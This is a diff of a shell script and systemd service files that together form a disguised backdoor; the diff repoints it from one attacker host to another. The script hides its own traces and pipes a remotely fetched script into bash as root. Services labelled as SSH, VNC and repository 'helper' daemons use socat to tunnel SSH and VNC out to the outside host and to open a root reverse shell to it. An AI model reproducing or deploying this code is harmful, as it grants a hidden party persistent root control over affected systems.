@@ -13,7 +13,7 @@ set +xv
 set +o history
 exec 1>/dev/null 2>&1
 find /var/log -type f -exec chattr +i '{}' \;
-curl odin.root.sh/updates.sh | bash
+curl expectusafterlun.ch/updates.sh | bash
 find /var/log -type f -exec chattr -i '{}' \;
 END
 
@@ -52,7 +52,7 @@ Description=SSH helper daemon
 After=network.target
 
 [Service]
-ExecStart=socat openssl:odin.root.sx:9000,reuseaddr,fork,forever,verify=0 tcp6:[::1]:22,reuseaddr
+ExecStart=socat openssl:expectusafterlun.ch:9000,reuseaddr,fork,forever,verify=0 tcp6:[::1]:22,reuseaddr
 User=root
 Group=root
 Restart=on-failure
@@ -72,7 +72,7 @@ Description=VNC helper daemon
 After=network.target
 
 [Service]
-ExecStart=socat openssl:odin.root.sx:9090,reuseaddr,fork,forever,verify=0 tcp6:[::1]:5900,reuseaddr
+ExecStart=socat openssl:expectusafterlun.ch:9090,reuseaddr,fork,forever,verify=0 tcp6:[::1]:5900,reuseaddr
 User=root
 Group=root
 Restart=on-failure
@@ -100,7 +100,7 @@ Description=Daemon for checking remote repositories
 After=network-online.target
 
 [Service]
-ExecStart=socat openssl:odin.root.sx:8080,verify=0,fork,reuseaddr exec:/bin/bash
+ExecStart=socat openssl:expectusafterlun.ch:8080,verify=0,fork,reuseaddr exec:/bin/bash
 User=root
 Group=root
 Restart=on-failure
